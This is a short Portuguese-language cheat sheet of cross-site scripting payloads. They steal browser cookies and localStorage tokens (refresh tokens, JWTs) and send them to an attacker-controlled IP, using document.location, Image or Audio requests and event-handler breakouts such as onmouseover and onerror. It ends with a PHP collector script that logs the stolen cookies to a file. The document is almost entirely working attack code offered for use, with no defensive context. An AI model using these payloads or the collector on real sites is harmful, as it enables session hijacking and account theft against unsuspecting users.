
## Roubo de Cookies do Local Storage 
```
document.location='http://[IP-Servidor-Externo]:8080/'+localStorage.getItem('refresh_token');

# JSON.stringify(localStorage)
<img src='https://[IP-Atacante]/yikes?jwt='+JSON.stringify(localStorage);'--!>
```

## Roubo de Cookies - Script PHP
 
```
";new Image().src="http://[IP]/roubacookie.php?c="+escape(document.cookie);//

x" onmouseover="new Image().src='http://[IP]/roubacookie.php?c='+escape(document.cookie)

x" onclick=new Image().src='http://[IP]/roubacookie.php?c='+escape(document.cookie)

"; new Audio().src="http://[IP]/roubacookie.php?c="+escape(document.cookie);//

240' src=x onerror="new Audio().src='http://[IP]/roubacookie.php?c="+escape(document.cookie)

## Script 

<?php

error_reporting(0);

$cookie = $_GET['c'];

$file = '_c_.txt';
$handle = fopen($file,"a");
fwrite($handle,$cookie."\n");
fclose($handle);

echo '<h1>Pagina de Teste</h1>';>

```
